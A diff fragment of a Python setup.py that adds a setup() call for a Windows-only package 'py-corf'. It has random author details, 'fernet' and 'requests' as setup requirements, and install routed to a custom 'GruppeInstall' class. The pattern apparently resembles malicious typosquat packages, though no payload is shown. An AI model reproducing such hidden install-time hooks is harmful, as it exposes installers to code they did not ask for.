@@ -18,5 +18,22 @@ class GruppeInstall(install):
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+setup(
+    name="py-corf",
+    version=VERSION,
+    author="lIbhwCraQWBKrEp",
+    author_email="GaigZhXwGJlVboFju@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': GruppeInstall,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
